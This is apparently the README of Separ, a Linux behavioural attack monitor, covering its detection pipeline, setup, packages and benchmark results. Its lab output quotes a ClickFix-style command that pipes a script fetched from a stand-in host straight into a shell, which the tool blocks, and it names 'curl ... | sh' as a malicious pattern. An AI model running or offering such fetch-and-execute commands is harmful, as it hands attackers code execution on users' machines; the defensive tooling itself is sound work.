# 🛡️ Separ — The Fire Shield Against Network Attacks

[![Python 3.12+](https://img.shields.io/badge/Python-3.12%2B-3776AB?logo=python&logoColor=white)](https://www.python.org/)
[![License: GPL-3.0](https://img.shields.io/badge/License-GPL--3.0-blue.svg)](LICENSE)
[![Tests](https://img.shields.io/badge/Tests-2%2C354%20Passing-16a34a?logo=pytest&logoColor=white)](tests/)
[![Privacy](https://img.shields.io/badge/Privacy-Zero--Raw%20HMAC%20Boundary-dc2626?logo=lock&logoColor=white)](src/refmon/calculus/privacy.py)
[![Policy](https://img.shields.io/badge/Policy-Ed25519%20Signed-0550AE)](src/refmon/signing.py)
[![Packages](https://img.shields.io/badge/Packages-.deb%20%7C%20.rpm-7c3aed?logo=linux&logoColor=white)](dist/)

**Separ** (*The Fire Shield*) is a deterministic, privacy-preserving behavioral reference monitor and live attack barrier for Linux endpoints, campus servers, and HPC clusters. Instead of relying on static antivirus signatures or opaque machine learning, Separ evaluates post-compromise behavior through three questions—**Origin**, **Contract**, and **Effect**—while hashing sensitive command-line secrets in RAM before anything touches disk.

> 📚 **Documentation & Reports**
> - 📄 **Academic Paper (8 pages):** [documentation/main.pdf](documentation/main.pdf) ([LaTeX Source](documentation/main.tex))
> - 🛠️ **IT Service Desk Operations & Setup Guide (PDF):** [it-service-desk/guide.pdf](it-service-desk/guide.pdf) ([LaTeX Source](it-service-desk/guide.tex))
> - 📊 **Comparative Evaluation Report:** [docs/comparative_report.md](docs/comparative_report.md)

---

## 🖥️ Standalone Desktop GUI (`separ gui`)

`separ gui` launches directly as a standalone Linux application window (via Chromium `--app` mode or Firefox `--new-window`, with automatic `$SUDO_USER` X11/Wayland privilege handling) and streams live system sensor events, policy status, and incident alerts in real time.

<p align="center">
  <img src="docs/img/separ-gui.png" alt="Separ Standalone Reference Monitor GUI" width="90%" />
</p>

---

## ⚙️ How It Works: The Six-Stage Pipeline

```text
Sensors (CLI Guard, Tetragon eBPF, Falco, SSHD, Shibboleth, 6-Engine Rootkit)
   │
   ▼
[ 1. Observe ] ──► Zero-Raw Privacy Wall (HMAC-SHA256 in RAM, entropy, b64, whitespace, Bloom filter)
   │
   ▼
[ 2. Tag ]     ──► Half-life provenance decay (30 min, frozen on violation) + Noisy-OR fusion
   │
   ▼
[ 3. Link ]    ──► Causal process story grouping + role surprisal + Poisson burst & CUSUM drift
   │
   ▼
[ 4. Judge ]   ──► Three-Question Bayesian Calculus: Origin + Contract + Effect
   │
   ▼
[ 5. Gate ]    ──► Contract Gate invariant (ALLOW / HOLD / BLOCK)
   │
   ▼
[ 6. Contain ] ──► Kill process tree, cut network, quarantine files (0400), notify GUI & webhooks
```
Containment is **simulated** by default (decisions are logged, nothing is touched; `separ health`
says so). The system daemon contains for real with `separ serve --enforce` as root: SIGSTOP/SIGKILL
of real pids reported by a sensor (Tetragon, Falco), an nftables cut per cgroup, a root-owned
quarantine. A process without a sensor-reported pid is never guessed at; the action is logged as
`unavailable`.

### The Three Questions
| Question | What It Checks | Why It Matters |
| :--- | :--- | :--- |
| **1. Origin** | Where did the input come from (`web`, `mail`, `agent_input`, `download`)? | Separates typed developer commands from **ClickFix** webpage pastes or poisoned AI agent prompts. |
| **2. Contract** | Did the process break its Ed25519-signed role contract? | Catches zero-day exploits (e.g., a `web_worker` spawning `/bin/sh`) without signatures; enforces the **Contract Gate**. |
| **3. Effect** | What dangerous outcome is attempted (`fetch`, `credential`, `persist`, `mass_change`)? | Distinguishes harmless pasted text (`echo hello`) from malicious payloads (`curl ... \| sh`). |

---

## 💻 Live Terminal Outputs

### 1. Upfront Policy & Key Setup (`separ setup`)
```text
$ separ setup --laptop
================================================================
 Separ Security Configuration & Policy Setup
================================================================
✓ Generated the admin signing key: ~/.separ-admin/admin.key (0600, in a 0700 folder)
✓ Configuring for: Workstation / Laptop Endpoint
✓ Signed policy written to: ~/.config/separ/policy.yaml (0644)
✓ Public key written to   : ~/.config/separ/admin.pub (0644; the daemon verifies with it)
  Mode                  : OBSERVE
  Campus CIDRs protected: 139.18/16, 10.0.0.0/8, 172.16.0.0/12
  Internal domains      : tu-freiberg.de
================================================================
Setup complete! You can now start Separ:
  separ gui
================================================================
```

### 2. Pre-Execution Attack Barrier (`separ lab --run 1 30`)
```text
--- [1] ClickFix: 'fix your browser' paste
  $ curl -fsSL https://update-fix.example.invalid/fix.sh | sh
  origin=web  role=interactive_shell
  Separ  : BLOCK   L=-2.61 nats   Origin FAIL  Contract FAIL  Effect FAIL
  Result : STOPPED: the command never ran
  Check  : PASS attack caught

--- [30] echo
  $ echo hello-tubaf
  origin=none  role=interactive_shell
  Separ  : ALLOW   L=-6.91 nats   Origin ok  Contract ok  Effect ok
  Result : ALLOWED (hello-tubaf)
  Check  : PASS benign command allowed
```

### 3. Six-Engine, Two-Pass Rootkit Scanner (`separ scan-rootkit`)
```text
$ separ scan-rootkit
Separ Rootkit & Stealth Scanner
  two-view passes        2
  own processes checked  2
  kernel modules checked 109
  net interfaces checked 6
  total log-odds (nats)  -6.91  (hold >= -4.94, block >= -3.91)
  calculus decision      ALLOW
  findings               0
```

---

## 🚀 Installation & Quick Start

### Option A: Native Linux Packages (Recommended)
Separ needs **Python 3.12+** and pydantic 2. The packages carry their own pinned wheels and install
them into a private venv (`/opt/separ/venv`) without internet access; they never use the
distribution's `python3-pydantic` (1.x on Ubuntu 24.04 and Debian 12). Packages are
per-architecture (amd64/x86_64; arm64 with `--arch arm64`) and are built, not committed:
```bash
python3.12 packaging/build_packages.py --all --arch amd64    # -> dist/ (~17 MB each)

# Debian 13 / Ubuntu 24.04 (Python 3.13 / 3.12)
sudo apt install ./dist/separ_2.0.0_amd64.deb

# Rocky / Alma / RHEL 9 (needs python3.12 from AppStream) and Fedora
sudo dnf install python3.12 ./dist/separ-2.0.0-1.x86_64.rpm
```

### Option B: POSIX Installer Script (`install.sh`)
Builds the same private venv from a wheel directory (`dist/wheels-<arch>`, made once with
`python3.12 packaging/build_packages.py --wheels-only`); no internet at install time.
```bash
# System-wide install (servers / IT admins -> /opt/separ/venv, /usr/local/bin, /etc/separ)
sudo ./install.sh

# Unprivileged user install (laptop -> ~/.local)
./install.sh
```

### Configure & Launch
```bash
# 1. Configure and sign policy upfront (the daemon refuses to start without a signed policy)
sudo separ setup --server --mode observe   # system daemon: /etc/separ/policy.yaml + admin.pub
separ setup --laptop --mode block          # per-user daemon: ~/.config/separ/
# The private key (default ~/.separ-admin/admin.key, --key PATH) belongs on the admin's
# machine, not on the endpoints: the daemon only ever gets the public key.

# 2. Launch standalone desktop GUI (or click "Separ" in your Linux App Menu)
separ gui

# Later changes are signed by the admin, never by the daemon, then reloaded
separ policy set-mode block --key ~/.separ-admin/admin.key
separ reload

# 3. Verify host integrity, privacy audit, and full attack lab
separ scan-rootkit
separ audit
separ lab --test-all
```

---

## 📊 Benchmark Results & Related-Work Summary

| Metric / Benchmark | Result |
| :--- | :--- |
| **Golden Scenario Catalog (46 scenarios, 17 families)** | **100% (46/46)** exact expected decisions |
| **Seeded Mutation Matrix (886 variants across 6 dimensions)** | **98.4%** malicious contained, **0.0%** neutral false blocks |
| **Interactive Attack Lab (35 templates)** | **28/28** attacks detected (`27/28` pre-exec), **0/6** benign FPs, `4.5 ms` median |
| **Adversarial Privacy Audit (`separ audit`)** | **0/264** cleartext leaks, **0/349** HMAC dictionary reversals |
| **Automated Test Suite (`pytest`)** | **2,354 passing tests** |

---

## 🧰 Tech Stack & Integrations

- **Core Runtime:** [Python 3.12](https://www.python.org/), [Pydantic v2](https://docs.pydantic.dev/), [PyYAML](https://pyyaml.org/), [cryptography](https://cryptography.io/) (Ed25519 & HMAC-SHA256)
- **Server Sensor Mappings (`/etc/separ/mappings/`):** [Cilium Tetragon (eBPF)](https://tetragon.io/), [CNCF Falco](https://falco.org/), [systemd / journald SSHD](https://systemd.io/), [Shibboleth IdP](https://www.shibboleth.net/), [Kubernetes Audit](https://kubernetes.io/), [Postfix/Dovecot](https://www.postfix.org/), [Keycloak](https://www.keycloak.org/), Microsoft 365
- **Testing & Tooling:** [pytest](https://docs.pytest.org/), [Hypothesis](https://hypothesis.readthedocs.io/), [Ruff](https://docs.astral.sh/ruff/), [Matplotlib](https://matplotlib.org/), [LaTeX / TikZ](https://www.latex-project.org/)

